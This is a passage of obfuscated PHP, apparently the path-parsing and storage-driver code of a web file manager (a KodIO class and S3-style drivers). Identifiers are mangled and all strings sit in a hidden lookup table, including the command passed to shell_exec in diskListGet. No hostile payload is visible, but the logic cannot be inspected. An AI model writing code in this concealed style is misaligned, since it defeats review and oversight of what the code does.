self::KOD_IO, $ØÒÙ¿çÂ[1399] => self::KOD_USER_RECENT, $ØÒÙ¿çÂ[1400] => self::KOD_USER_DRIVER); } public static function parse($…¦…³¡) { $ÉÓÓÃúŠ =& $_SERVER[öæÛ¿©¿]; $…¦…³¡ = self::clear($…¦…³¡); $¿½Ï¿÷İ = array_values(self::typeList()); preg_match($ÉÓÓÃúŠ[1401], $…¦…³¡, $çâ˜ì•¼); $á£ß = array($ÉÓÓÃúŠ[507] => !1, $ÉÓÓÃúŠ[1402] => !1, $ÉÓÓÃúŠ[504] => !1, $ÉÓÓÃúŠ[87] => $…¦…³¡, $ÉÓÓÃúŠ[1299] => !1, $ÉÓÓÃúŠ[1298] => $ÉÓÓÃúŠ[12]); if (is_array($çâ˜ì•¼) && count($çâ˜ì•¼) == 5) { $Â«ÔÏğ = $ÉÓÓÃúŠ[1403] . $çâ˜ì•¼[2] . $ÉÓÓÃúŠ[403]; if (in_array($Â«ÔÏğ, $¿½Ï¿÷İ)) { $á£ß[$ÉÓÓÃúŠ[1299]] = $çâ˜ì•¼[1]; $á£ß[$ÉÓÓÃúŠ[33]] = $Â«ÔÏğ; $á£ß[$ÉÓÓÃúŠ[1404]] = substr($Â«ÔÏğ, 1, -1); $á£ß[$ÉÓÓÃúŠ[483]] = $çâ˜ì•¼[3]; } $á£ß[$ÉÓÓÃúŠ[1298]] = $çâ˜ì•¼[4]; } if ($á£ß[$ÉÓÓÃúŠ[507]] == self::KOD_SOURCE) { $á£ß[$ÉÓÓÃúŠ[483]] = intval($á£ß[$ÉÓÓÃúŠ[483]]); $á£ß[$ÉÓÓÃúŠ[1302]] = $á£ß[$ÉÓÓÃúŠ[483]]; } $ÛÔí†Şü = array($ÉÓÓÃúŠ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $á£ß[$ÉÓÓÃúŠ[1366]] = in_array($á£ß[$ÉÓÓÃúŠ[33]], $ÛÔí†Şü); return $á£ß; } public static function isTruePath($ôÌååæã) { $³à¶û¨Ò =& $_SERVER[öæÛ¿©¿]; if (substr($ôÌååæã, 0, 1) != $³à¶û¨Ò[1403]) { return !0; } if (strpos($ôÌååæã, $³à¶û¨Ò[494]) === 0) { return !0; } if (strpos($ôÌååæã, $³à¶û¨Ò[1370]) === 0) { return !0; } if (strpos($ôÌååæã, $³à¶û¨Ò[1405]) === 0) { return !0; } if (strpos($ôÌååæã, $³à¶û¨Ò[1406]) === 0) { return !0; } if (strpos($ôÌååæã, $³à¶û¨Ò[1407]) === 0) { return !0; } if (strpos($ôÌååæã, $³à¶û¨Ò[1408]) === 0) { return !0; } return !1; } public static function clear($…¬€º‘ä) { $ÃÁ¼ÌöÊ =& $_SERVER[öæÛ¿©¿]; $…¬€º‘ä = str_replace(array($ÃÁ¼ÌöÊ[1192], $ÃÁ¼ÌöÊ[286]), $ÃÁ¼ÌöÊ[53], $…¬€º‘ä); $…¬€º‘ä = str_replace($ÃÁ¼ÌöÊ[98], $ÃÁ¼ÌöÊ[8], $…¬€º‘ä); $Ğ¬òú–á = $ÃÁ¼ÌöÊ[1409]; if (substr($…¬€º‘ä, 0, 3) == $ÃÁ¼ÌöÊ[1410]) { $…¬€º‘ä = substr($…¬€º‘ä, 3); } while (strstr($…¬€º‘ä, $Ğ¬òú–á)) { $…¬€º‘ä = str_replace($Ğ¬òú–á, $ÃÁ¼ÌöÊ[8], $…¬€º‘ä); } $…¬€º‘ä = preg_replace($ÃÁ¼ÌöÊ[1411], $ÃÁ¼ÌöÊ[8], $…¬€º‘ä); if ($…¬€º‘ä == $ÃÁ¼ÌöÊ[8]) { return $ÃÁ¼ÌöÊ[8]; } $…¬€º‘ä = rtrim($…¬€º‘ä, $ÃÁ¼ÌöÊ[8]); return $…¬€º‘ä; } public static function pathTrue($ÙÀ§–•À) { $±«Û™É» =& $_SERVER[öæÛ¿©¿]; if (!$ÙÀ§–•À) { return $±«Û™É»[12]; } $ÙÀ§–•À = str_replace($±«Û™É»[255], $±«Û™É»[8], str_replace($±«Û™É»[1412], $±«Û™É»[8], $ÙÀ§–•À)); $ÙÀ§–•À = str_replace($±«Û™É»[255], $±«Û™É»[8], str_replace($±«Û™É»[1412], $±«Û™É»[8], $ÙÀ§–•À)); if (!strstr($ÙÀ§–•À, $±«Û™É»[1410])) { return $ÙÀ§–•À; } $†É³ØıÅ = explode($±«Û™É»[8], $ÙÀ§–•À); foreach ($†É³ØıÅ as $ñ»•«¿â => $Ó¡»›ç) { if ($Ó¡»›ç !== $±«Û™É»[1413]) { continue; } for ($üó¼œğ = $ñ»•«¿â; $üó¼œğ >= 0; $üó¼œğ--) { if ($†É³ØıÅ[$üó¼œğ] === $±«Û™É»[10] || $†É³ØıÅ[$üó¼œğ] === $±«Û™É»[1413] || $†É³ØıÅ[$üó¼œğ] === -1) { continue; } if ($†É³ØıÅ[$üó¼œğ] === $±«Û™É»[12]) { $†É³ØıÅ[$ñ»•«¿â] = -1; break; } $†É³ØıÅ[$ñ»•«¿â] = -1; $†É³ØıÅ[$üó¼œğ] = -1; break; } } $¹ç»‡á§ = array(); foreach ($†É³ØıÅ as $Ó¡»›ç) { if ($Ó¡»›ç !== -1) { $¹ç»‡á§[] = $Ó¡»›ç; } } $ØÉã†ÜÆ = implode($±«Û™É»[8], $¹ç»‡á§); if (strpos($ØÉã†ÜÆ, $±«Û™É»[1414]) === 0) { $ØÉã†ÜÆ = $±«Û™É»[1410] . substr($ØÉã†ÜÆ, strlen($±«Û™É»[1414])); } return $ØÉã†ÜÆ; } public static function pathUrlClear($Û™Ô§ÖÜ) { $Â‘£­—Û =& $_SERVER[öæÛ¿©¿]; if (!$Û™Ô§ÖÜ) { return $Û™Ô§ÖÜ; } $Û™Ô§ÖÜ = rawurldecode($Û™Ô§ÖÜ); $Û™Ô§ÖÜ = str_replace($Â‘£­—Û[1412], $Â‘£­—Û[8], $Û™Ô§ÖÜ); if (strpos($Û™Ô§ÖÜ, $Â‘£­—Û[76]) > 0) { $Û™Ô§ÖÜ = substr($Û™Ô§ÖÜ, 0, strpos($Û™Ô§ÖÜ, $Â‘£­—Û[76])); } if (strpos($Û™Ô§ÖÜ, $Â‘£­—Û[1415]) > 0) { $Û™Ô§ÖÜ = substr($Û™Ô§ÖÜ, 0, strpos($Û™Ô§ÖÜ, $Â‘£­—Û[1415])); } return $Û™Ô§ÖÜ; } public static function sourceID($½²Û·Ä²) { $Ë¤å÷øØ =& $_SERVER[öæÛ¿©¿]; $ßÕŞßÂ = self::parse($½²Û·Ä²); if ($ßÕŞßÂ[$Ë¤å÷øØ[33]] !== self::KOD_SOURCE) { show_json(LNG($Ë¤å÷øØ[1416]), !1); } return $ßÕŞßÂ[$Ë¤å÷øØ[483]]; } public static function make($äüš£€í) { if (!$äüš£€í) { return !1; } return self::makePath(self::KOD_SOURCE, intval($äüš£€í)); } public static function makeShare($À§Æıá, $ô®¯ó) { return self::makePath(self::KOD_SHARE_ITEM, $À§Æıá, $ô®¯ó); } public static function makeFileTypePath($¿îÓáÖ¸) { return self::makePath(self::KOD_USER_FILE_TYPE, $¿îÓáÖ¸); } public static function makeFileTagPath($«›äú‡) { return self::makePath(self::KOD_USER_FILE_TAG, $«›äú‡); } public static function makePath($Š¡³Ğ², $»Ø²à³ = '', $”š¢ƒËù = '') { $Ğƒú†Ãå =& $_SERVER[öæÛ¿©¿]; $õÛ®¹í¢ = substr($Š¡³Ğ², 1, -1); $šòƒ¶É = $Ğƒú†Ãå[1417] . $õÛ®¹í¢ . $Ğƒú†Ãå[1418] . $»Ø²à³ . $Ğƒú†Ãå[1419]; $šòƒ¶É = $”š¢ƒËù ? $šòƒ¶É . $”š¢ƒËù . $Ğƒú†Ãå[8] : $šòƒ¶É; return $šòƒ¶É; } public static function hashPath($ƒâüËªö, $âÑ‡ç¢Ä = false) { $¨Ó¥ŒÍ =& $_SERVER[öæÛ¿©¿]; if (!$ƒâüËªö) { return $¨Ó¥ŒÍ[12]; } $†æË„‹œ = is_array($ƒâüËªö) ? $ƒâüËªö : IO::info($ƒâüËªö); $šÊæ¢îÖ = _get($†æË„‹œ, $¨Ó¥ŒÍ[1420], $¨Ó¥ŒÍ[12]); if (!$šÊæ¢îÖ && isset($†æË„‹œ[$¨Ó¥ŒÍ[553]])) { $šÊæ¢îÖ = $†æË„‹œ[$¨Ó¥ŒÍ[553]]; } if (!$šÊæ¢îÖ && isset($†æË„‹œ[$¨Ó¥ŒÍ[236]])) { $šÊæ¢îÖ = trim($†æË„‹œ[$¨Ó¥ŒÍ[236]], $¨Ó¥ŒÍ[119]); } if ($šÊæ¢îÖ) { return $šÊæ¢îÖ; } if (!$šÊæ¢îÖ && isset($†æË„‹œ[$¨Ó¥ŒÍ[192]]) && $†æË„‹œ[$¨Ó¥ŒÍ[192]]) { $†æË„‹œ = IO::info(KodIO::make($†æË„‹œ[$¨Ó¥ŒÍ[192]])); $šÊæ¢îÖ = _get($†æË„‹œ, $¨Ó¥ŒÍ[1420], $¨Ó¥ŒÍ[12]); if (!$šÊæ¢îÖ && isset($†æË„‹œ[$¨Ó¥ŒÍ[553]])) { $šÊæ¢îÖ = $†æË„‹œ[$¨Ó¥ŒÍ[553]]; } } $’İå‡Ê³ = md5($†æË„‹œ[$¨Ó¥ŒÍ[87]] . $†æË„‹œ[$¨Ó¥ŒÍ[79]] . $†æË„‹œ[$¨Ó¥ŒÍ[88]]); $Â³é’‡Î = $’İå‡Ê³ . $¨Ó¥ŒÍ[1421]; $šÊæ¢îÖ = $šÊæ¢îÖ ? $šÊæ¢îÖ : Cache::get($Â³é’‡Î); if (!$šÊæ¢îÖ && $âÑ‡ç¢Ä) { $šÊæ¢îÖ = IO::hashSimple($†æË„‹œ[$¨Ó¥ŒÍ[87]]); Cache::set($Â³é’‡Î, $šÊæ¢îÖ ? $šÊæ¢îÖ : $’İå‡Ê³, 3600 * 24 * 30); } return $šÊæ¢îÖ ? $šÊæ¢îÖ : $’İå‡Ê³; } public static function hashPathSafe($ÈÔÀµÏÂ, $ÏŞ¬²¬Ù = false) { $¶Œ½è°¢ =& $_SERVER[öæÛ¿©¿]; $úíÜ¨¨º = self::hashPath($ÈÔÀµÏÂ, $ÏŞ¬²¬Ù); return md5($úíÜ¨¨º . $¶Œ½è°¢[1422] . Model($¶Œ½è°¢[865])->get($¶Œ½è°¢[866])); } public static function initSystemPath() { $Ú’È©‘Õ =& $_SERVER[öæÛ¿©¿]; if (defined($Ú’È©‘Õ[1423])) { return; } define($Ú’È©‘Õ[1423], self::systemPath($Ú’È©‘Õ[190])); define($Ú’È©‘Õ[1424], self::systemPath($Ú’È©‘Õ[1425])); define($Ú’È©‘Õ[1426], self::systemPath($Ú’È©‘Õ[1427])); define($Ú’È©‘Õ[1428], self::systemPath($Ú’È©‘Õ[1429])); IOHistory::bindEvent(); } public static function systemPath($Ìß’ÙÏ) { $„…Ç¨Èû =& $_SERVER[öæÛ¿©¿]; $óÕÛ©´† = $„…Ç¨Èû[1430] . ucfirst($Ìß’ÙÏ); $“â…“£¼ = Model($„…Ç¨Èû[865])->get($óÕÛ©´†); if ($“â…“£¼) { return $“â…“£¼; } if ($Ìß’ÙÏ == $„…Ç¨Èû[190]) { $“â…“£¼ = self::make(Model($„…Ç¨Èû[925])->systemRootPathAdd($„…Ç¨Èû[624])); } else { $“â…“£¼ = self::systemPath($„…Ç¨Èû[190]); $ñºóÓ£“ = self::sourceID($“â…“£¼); $“â…“£¼ = self::make(Model($„…Ç¨Èû[925])->mkdir($ñºóÓ£“, $Ìß’ÙÏ)); } Model($„…Ç¨Èû[865])->set($óÕÛ©´†, $“â…“£¼); return $“â…“£¼; } public static function systemFolder($ÇËş½ÀÅ) { $³»¨ìŞ = IO_PATH_SYSTEM_SOURCE . $ÇËş½ÀÅ; $È…®ˆşª = Cache::get($³»¨ìŞ); if (!$È…®ˆşª) { $¶»·¹¨Ô = IO::infoFullSimple($³»¨ìŞ); if (!$¶»·¹¨Ô) { $È…®ˆşª = IO::mkdir($³»¨ìŞ, REPEAT_SKIP); } else { $È…®ˆşª = $¶»·¹¨Ô[$_SERVER[öæÛ¿©¿][87]]; } Cache::set($³»¨ìŞ, $È…®ˆşª, 3600 * 10); } return $È…®ˆşª; } public static function defaultDriver() { return Model($_SERVER[öæÛ¿©¿][860])->defaultDriver(); } public static function defaultDriverInit() { $—•È¸¥Ù =& $_SERVER[öæÛ¿©¿]; static $È«òí©¡ = false; if ($È«òí©¡) { return $È«òí©¡; } $¤Şû¯Â´ = self::defaultDriver(); $È«òí©¡ = IO::init($—•È¸¥Ù[1431] . $¤Şû¯Â´[$—•È¸¥Ù[483]] . $—•È¸¥Ù[1419]); return $È«òí©¡; } public static function fileTypeList() { $àèÓÂè” =& $_SERVER[öæÛ¿©¿]; $ÅğÊŞåÙ = $GLOBALS[$àèÓÂè”[6]][$àèÓÂè”[1432]]; foreach ($ÅğÊŞåÙ as $®Ñ„À·‘ => $¨Ä¨¿Ÿƒ) { $ßÒÀ½” = $àèÓÂè”[1433] . $®Ñ„À·‘; $… †èÅº = LNG($ßÒÀ½”); if ($ßÒÀ½” != $… †èÅº) { $ÅğÊŞåÙ[$®Ñ„À·‘][$àèÓÂè”[32]] = $… †èÅº; } } return $ÅğÊŞåÙ; } public static function ioFileDriverGet($ßå‰í± = '') { $îÖÉÎÚ¥ =& $_SERVER[öæÛ¿©¿]; static $ˆÍŞ«àÛ = array(); static $ªš÷³¡ = array(); static $éÆëä»‹ = array(); static $ç™›¬‘Ÿ = false; if ($ç™›¬‘Ÿ === !1) { $ç™›¬‘Ÿ = array($îÖÉÎÚ¥[594] => array(), $îÖÉÎÚ¥[681] => array()); $ö”ßõıå = Model($îÖÉÎÚ¥[1434])->get(!1, $îÖÉÎÚ¥[1435]); foreach ($ö”ßõıå as $êğ—« => $Å¿×î»§) { if (!$Å¿×î»§ || $Å¿×î»§ == $îÖÉÎÚ¥[12]) { continue; } if (strstr($êğ—«, $îÖÉÎÚ¥[1436])) { $Ù¢ˆËàÕ = str_replace($îÖÉÎÚ¥[1436], $îÖÉÎÚ¥[12], $êğ—«); $ç™›¬‘Ÿ[$îÖÉÎÚ¥[594]][$Ù¢ˆËàÕ] = $Å¿×î»§; } else { if (strstr($êğ—«, $îÖÉÎÚ¥[1437])) { $Ù¢ˆËàÕ = str_replace($îÖÉÎÚ¥[1437], $îÖÉÎÚ¥[12], $êğ—«); $ç™›¬‘Ÿ[$îÖÉÎÚ¥[681]][$Ù¢ˆËàÕ] = $Å¿×î»§; } } } } $ÉëİŸñ¾ = self::defaultDriver(); if (!$ßå‰í± || !$ç™›¬‘Ÿ[$îÖÉÎÚ¥[594]] && !$ç™›¬‘Ÿ[$îÖÉÎÚ¥[681]]) { return $ÉëİŸñ¾; } $ÖÚ‰¯‡ = self::getPathSourceID($ßå‰í±); if (!$ÖÚ‰¯‡) { return $ÉëİŸñ¾; } if (isset($ˆÍŞ«àÛ[$ÖÚ‰¯‡])) { return $ˆÍŞ«àÛ[$ÖÚ‰¯‡]; } $Íò£ô¡ù = Model($îÖÉÎÚ¥[925])->sourceInfo($ÖÚ‰¯‡); $–ô¸äï‘ = $Íò£ô¡ù[$îÖÉÎÚ¥[585]]; $Æù’äË = array(); if (!$Íò£ô¡ù) { return $ÉëİŸñ¾; } if ($Íò£ô¡ù[$îÖÉÎÚ¥[189]] == $îÖÉÎÚ¥[91]) { if (isset($éÆëä»‹[$–ô¸äï‘])) { return $éÆëä»‹[$–ô¸äï‘]; } if (isset($ç™›¬‘Ÿ[$îÖÉÎÚ¥[681]][$–ô¸äï‘])) { $ÁÚ‰Â« = Model($îÖÉÎÚ¥[860])->driverInfo($ç™›¬‘Ÿ[$îÖÉÎÚ¥[681]][$–ô¸äï‘]); $ÉëİŸñ¾ = $ÁÚ‰Â« ? $ÁÚ‰Â« : $ÉëİŸñ¾; $éÆëä»‹[$–ô¸äï‘] = $ÉëİŸñ¾; $ˆÍŞ«àÛ[$ÖÚ‰¯‡] = $ÉëİŸñ¾; return $ÉëİŸñ¾; } $Æù’äË = self::groupParentUser($–ô¸äï‘); } else { if ($Íò£ô¡ù[$îÖÉÎÚ¥[189]] == $îÖÉÎÚ¥[520]) { $§×ë…ÙŞ = Model($îÖÉÎÚ¥[1438])->getInfo($–ô¸äï‘); if ($§×ë…ÙŞ) { $Æù’äË = explode($îÖÉÎÚ¥[50], trim($§×ë…ÙŞ[$îÖÉÎÚ¥[600]], $îÖÉÎÚ¥[50])); $Æù’äË = array_remove_value($Æù’äË, $îÖÉÎÚ¥[229]); $Æù’äË[] = $–ô¸äï‘; $Æù’äË = array_reverse($Æù’äË); } } } foreach ($Æù’äË as $Íü³Ã—Ö) { if (!isset($ç™›¬‘Ÿ[$îÖÉÎÚ¥[594]][$Íü³Ã—Ö])) { continue; } if (isset($ªš÷³¡[$Íü³Ã—Ö])) { return $ªš÷³¡[$Íü³Ã—Ö]; } $ÁÚ‰Â« = Model($îÖÉÎÚ¥[860])->driverInfo($ç™›¬‘Ÿ[$îÖÉÎÚ¥[594]][$Íü³Ã—Ö]); $ÉëİŸñ¾ = $ÁÚ‰Â« ? $ÁÚ‰Â« : $ÉëİŸñ¾; $ªš÷³¡[$Íü³Ã—Ö] = $ÉëİŸñ¾; break; } if ($Íò£ô¡ù[$îÖÉÎÚ¥[189]] == $îÖÉÎÚ¥[91]) { $éÆëä»‹[$–ô¸äï‘] = $ÉëİŸñ¾; } $ˆÍŞ«àÛ[$ÖÚ‰¯‡] = $ÉëİŸñ¾; return $ÉëİŸñ¾; } private static function getPathSourceID($ËëŒäĞ) { $¬Ş‡ªîñ =& $_SERVER[öæÛ¿©¿]; static $³˜¸ø˜“ = array(); if (!$ËëŒäĞ) { return $¬Ş‡ªîñ[12]; } $Œ£¾É°é = substr($ËëŒäĞ, 0, strlen($¬Ş‡ªîñ[494])) == $¬Ş‡ªîñ[494]; $ÖıÁöı‚ = substr($ËëŒäĞ, 0, strlen($¬Ş‡ªîñ[1405])) == $¬Ş‡ªîñ[1405]; $“§ÃçÈ¹ = substr($ËëŒäĞ, 0, strlen($¬Ş‡ªîñ[1406])) == $¬Ş‡ªîñ[1406]; if (!$Œ£¾É°é && !$ÖıÁöı‚ && !$“§ÃçÈ¹) { return $¬Ş‡ªîñ[12]; } $ûáÕ‰Ÿ = self::parse($ËëŒäĞ); $Éü ÖïÄ = $ûáÕ‰Ÿ[$¬Ş‡ªîñ[1299]]; if ($Œ£¾É°é) { return $ûáÕ‰Ÿ[$¬Ş‡ªîñ[483]]; } if (isset($³˜¸ø˜“[$Éü ÖïÄ])) { $È—Ì†×Í = $³˜¸ø˜“[$Éü ÖïÄ]; } else { $È—Ì†×Í = IO::init($Éü ÖïÄ); $³˜¸ø˜“[$Éü ÖïÄ] = $È—Ì†×Í; } if (isset($È—Ì†×Í->pathParse[$¬Ş‡ªîñ[1302]])) { return $È—Ì†×Í->pathParse[$¬Ş‡ªîñ[1302]]; } return $¬Ş‡ªîñ[12]; } private static function groupParentUser($¿Õ¨ìŞ¯) { $ïíÏâñ =& $_SERVER[öæÛ¿©¿]; $¤›‚¤Ë = Model($ïíÏâñ[613])->getInfo($¿Õ¨ìŞ¯); if (!$¤›‚¤Ë) { return array(); } $İËõÁÖã = array_to_keyvalue($¤›‚¤Ë[$ïíÏâñ[1439]], $ïíÏâñ[12], $ïíÏâñ[1440]); $øÜõÄèæ = array(); foreach ($¤›‚¤Ë[$ïíÏâñ[1439]] as $¨Éòª¸À) { $øÜõÄèæ[] = $¨Éòª¸À[$ïíÏâñ[1440]]; $³™ÑŒÌç = explode($ïíÏâñ[50], trim($¨Éòª¸À[$ïíÏâñ[600]], $ïíÏâñ[50])); $³™ÑŒÌç = array_remove_value($³™ÑŒÌç, $ïíÏâñ[229]); $³™ÑŒÌç = array_reverse($³™ÑŒÌç); $øÜõÄèæ = array_merge($øÜõÄèæ, $³™ÑŒÌç); } return array_unique($øÜõÄèæ); } public static function diskList($¿úûÄ­ı = true) { $Í»³œÁ = $_SERVER[öæÛ¿©¿][1441]; if ($¿úûÄ­ı) { $ëø„Çú¦ = Cache::get($Í»³œÁ); if (is_array($ëø„Çú¦)) { return $ëø„Çú¦; } } $ëø„Çú¦ = self::diskListGet(); Cache::set($Í»³œÁ, $ëø„Çú¦, 60); return $ëø„Çú¦; } public static function diskListGet() { $î–î®©Ë =& $_SERVER[öæÛ¿©¿]; $›–¹ôéø = array(); if ($GLOBALS[$î–î®©Ë[6]][$î–î®©Ë[1442]] == $î–î®©Ë[1443]) { $÷¶Šİ‡ = $î–î®©Ë[1444]; for ($Ì›‰àİ¸ = 0; $Ì›‰àİ¸ < strlen($÷¶Šİ‡); $Ì›‰àİ¸++) { $±ß²•éĞ = $÷¶Šİ‡[$Ì›‰àİ¸] . $î–î®©Ë[1445]; if (file_exists($±ß²•éĞ)) { $›–¹ôéø[] = $±ß²•éĞ; } } return $›–¹ôéø; } if (!function_exists($î–î®©Ë[99])) { $›–¹ôéø[] = $î–î®©Ë[939]; return $›–¹ôéø; } $º¬ÍÁÂ = explode($î–î®©Ë[286], shell_exec($î–î®©Ë[1446])); array_shift($º¬ÍÁÂ); array_pop($º¬ÍÁÂ); $šãõÌú› = array($î–î®©Ë[1447], $î–î®©Ë[1448], $î–î®©Ë[1449], $î–î®©Ë[1450], $î–î®©Ë[1451], $î–î®©Ë[1452], $î–î®©Ë[1453], $î–î®©Ë[1454]); foreach ($º¬ÍÁÂ as $˜º‘½ş) { $™¥÷Æ­Ò = preg_split($î–î®©Ë[1455], $˜º‘½ş); $±ß²•éĞ = $™¥÷Æ­Ò[count($™¥÷Æ­Ò) - 1]; if (!strstr($™¥÷Æ­Ò[0], $î–î®©Ë[1456]) || !$±ß²•éĞ) { continue; } $–øßøí‰ = rtrim($±ß²•éĞ, $î–î®©Ë[8]) . $î–î®©Ë[8]; $›–¹ôéø[] = $–øßøí‰; } return $›–¹ôéø; } public static function isSameDisk($ª×‡÷Å›, $Á—çî¦ª) { $è¹·Şİ =& $_SERVER[öæÛ¿©¿]; if ($GLOBALS[$è¹·Şİ[6]][$è¹·Şİ[1442]] == $è¹·Şİ[1443]) { return strtolower(substr($ª×‡÷Å›, 0, 1)) == strtolower(substr($Á—çî¦ª, 0, 1)); } $Ÿ”óÅ÷ = stat($ª×‡÷Å›); $¨±¡×Ÿ” = stat($Á—çî¦ª); if ($Ÿ”óÅ÷ === !1 || $¨±¡×Ÿ” === !1) { return !1; } return $Ÿ”óÅ÷[$è¹·Şİ[1457]] === $¨±¡×Ÿ”[$è¹·Şİ[1457]]; $¤¬˜Ô = self::diskList(); $Çùı­Ç = !1; $¡˜Ğù» = !1; sort($¤¬˜Ô); $¤¬˜Ô = array_reverse($¤¬˜Ô); $ª×‡÷Å› = rtrim($ª×‡÷Å›, $è¹·Şİ[8]) . $è¹·Şİ[8]; $Á—çî¦ª = rtrim($Á—çî¦ª, $è¹·Şİ[8]) . $è¹·Şİ[8]; foreach ($¤¬˜Ô as $µÕ ğ·•) { $ÊÆ…›ºæ = strlen($µÕ ğ·•); if (!$Çùı­Ç && substr($ª×‡÷Å›, 0, $ÊÆ…›ºæ) == $µÕ ğ·•) { $Çùı­Ç = $µÕ ğ·•; } if (!$¡˜Ğù» && substr($Á—çî¦ª, 0, $ÊÆ…›ºæ) == $µÕ ğ·•) { $¡˜Ğù» = $µÕ ğ·•; } if ($Çùı­Ç && $¡˜Ğù») { break; } } return $Çùı­Ç === $¡˜Ğù»; } public static function transferType($Ğë™Œ¨ö, $êôÕ¸) { $À¸Ãà™ş =& $_SERVER[öæÛ¿©¿]; $Íˆ½æ‰ò = self::driverType($Ğë™Œ¨ö); $õ„Ø—Ñ× = self::driverType($êôÕ¸); if ($Íˆ½æ‰ò[$À¸Ãà™ş[33]] == $õ„Ø—Ñ×[$À¸Ãà™ş[33]] && $Íˆ½æ‰ò[$À¸Ãà™ş[1458]] == $õ„Ø—Ñ×[$À¸Ãà™ş[1458]]) { return $À¸Ãà™ş[1459]; } if ($Íˆ½æ‰ò[$À¸Ãà™ş[33]] == $À¸Ãà™ş[973] && $õ„Ø—Ñ×[$À¸Ãà™ş[33]] == $À¸Ãà™ş[107]) { return $À¸Ãà™ş[1327]; } if ($Íˆ½æ‰ò[$À¸Ãà™ş[33]] == $À¸Ãà™ş[107] && $õ„Ø—Ñ×[$À¸Ãà™ş[33]] == $À¸Ãà™ş[973]) { return $À¸Ãà™ş[108]; } return $À¸Ãà™ş[1460]; } public static function driverType($çøÚ®Ï‰) { $©ğ’Ô‹Ê =& $_SERVER[öæÛ¿©¿]; $²¬«»œ = str_replace($©ğ’Ô‹Ê[1461], $©ğ’Ô‹Ê[12], strtolower($çøÚ®Ï‰->getType())); if ($²¬«»œ == $©ğ’Ô‹Ê[850] || $²¬«»œ == $©ğ’Ô‹Ê[1462] || $²¬«»œ == $©ğ’Ô‹Ê[1463]) { $Şƒªš¨ˆ = self::ioFileDriverGet($©ğ’Ô‹Ê[494] . $çøÚ®Ï‰->pathParse[$©ğ’Ô‹Ê[1302]] . $©ğ’Ô‹Ê[403]); $çøÚ®Ï‰ = IO::init($©ğ’Ô‹Ê[1431] . $Şƒªš¨ˆ[$©ğ’Ô‹Ê[483]] . $©ğ’Ô‹Ê[1419]); } else { if ($²¬«»œ == $©ğ’Ô‹Ê[1337] || $²¬«»œ == $©ğ’Ô‹Ê[1464]) { $çøÚ®Ï‰ = IO::init($çøÚ®Ï‰->pathParse[$©ğ’Ô‹Ê[1279]]); } } $ç‹òê‘â = $çøÚ®Ï‰->path; $²¬«»œ = str_replace($©ğ’Ô‹Ê[1461], $©ğ’Ô‹Ê[12], strtolower($çøÚ®Ï‰->getType())); if ($²¬«»œ == $©ğ’Ô‹Ê[107]) { return array($©ğ’Ô‹Ê[33] => $©ğ’Ô‹Ê[107], $©ğ’Ô‹Ê[1458] => $©ğ’Ô‹Ê[12], $©ğ’Ô‹Ê[87] => $ç‹òê‘â, $©ğ’Ô‹Ê[96] => $çøÚ®Ï‰); } return array($©ğ’Ô‹Ê[33] => $©ğ’Ô‹Ê[973], $©ğ’Ô‹Ê[1458] => $çøÚ®Ï‰->pathDriver, $©ğ’Ô‹Ê[87] => $ç‹òê‘â, $©ğ’Ô‹Ê[96] => $çøÚ®Ï‰); } public static function pathDriverType($§²ıü¿ş) { return $§²ıü¿ş ? self::driverType(IO::init($§²ıü¿ş)) : !1; } public static function pathDriverLocal($éìşŒùÕ) { $«ĞŠ®Æ’ =& $_SERVER[öæÛ¿©¿]; $ßüåà‚ì = $éìşŒùÕ ? self::driverType(IO::init($éìşŒùÕ)) : !1; return strtolower($ßüåà‚ì[$«ĞŠ®Æ’[33]]) == $«ĞŠ®Æ’[107] ? !0 : !1; } public static function allowCover($™é†˜, $ÖÀš“Á¯ = true) { $¸æ­ó =& $_SERVER[öæÛ¿©¿]; if (is_string($™é†˜)) { $™é†˜ = IO::info($™é†˜); } if (!$™é†˜ || $™é†˜[$¸æ­ó[33]] == $¸æ­ó[78] || $™é†˜[$¸æ­ó[79]] <= 100) { return !1; } if (isset($™é†˜[$¸æ­ó[1465]]) || !$™é†˜[$¸æ­ó[87]]) { return !1; } if (isset($™é†˜[$¸æ­ó[233]]) && !$™é†˜[$¸æ­ó[233]]) { return !1; } static $É‰˜ó’Â = false; if (!$É‰˜ó’Â || !$ÖÀš“Á¯) { $ã©àëÚµ = self::driverType(IO::init($™é†˜[$¸æ­ó[87]])); $À¸—ÄÜÑ = $ã©àëÚµ[$¸æ­ó[96]]; $É‰˜ó’Â = $¸æ­ó[195]; if ($ã©àëÚµ[$¸æ­ó[33]] == $¸æ­ó[107]) { $É‰˜ó’Â = $¸æ­ó[1466]; } if ($ã©àëÚµ[$¸æ­ó[96]] && is_array($ã©àëÚµ[$¸æ­ó[96]]->config)) { $è¤ÈÆ¢É = $ã©àëÚµ[$¸æ­ó[96]]->config; if (isset($è¤ÈÆ¢É[$¸æ­ó[1467]]) && $è¤ÈÆ¢É[$¸æ­ó[1467]]) { $É‰˜ó’Â = $¸æ­ó[1466]; } } $ıªŠÍ·× = KodIO::defaultDriver(); if (strtolower($ıªŠÍ·×[$¸æ­ó[96]]) == $¸æ­ó[107] && is_array($ıªŠÍ·×[$¸æ­ó[6]])) { $™ÊĞÄöÛ = $ıªŠÍ·×[$¸æ­ó[6]][$¸æ­ó[1311]]; if (substr($™ÊĞÄöÛ, 0, 2) == $¸æ­ó[1468]) { $™ÊĞÄöÛ = str_replace($¸æ­ó[1468], BASIC_PATH, $™ÊĞÄöÛ); } $™ÊĞÄöÛ = str_replace($¸æ­ó[255], $¸æ­ó[8], $™ÊĞÄöÛ); if (substr($™é†˜[$¸æ­ó[87]], 0, strlen($™ÊĞÄöÛ)) == $™ÊĞÄöÛ) { $É‰˜ó’Â = $¸æ­ó[195]; } } } return $É‰˜ó’Â == $¸æ­ó[1466] ? !0 : !1; } } class PathDriverBOS extends PathDriverS3 { public function __construct($ï…™Í£É) { parent::__construct($ï…™Í£É); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ ÜÛ†×ö) { parent::__construct($ ÜÛ†×ö); $this->setSignVersion($_SERVER[öæÛ¿©¿][248]); } public function uploadFormData($ä½“–Î, $‚œŸ’ŠÈ = 3600) { $Ø”ô©ïé =& $_SERVER[öæÛ¿©¿]; $”Œ©ƒ¦ = $Ø”ô©ïé[230]; $·«ƒ„± = $Ø”ô©ïé[1469]; $Òãµ½ª = $Ø”ô©ïé[262]; 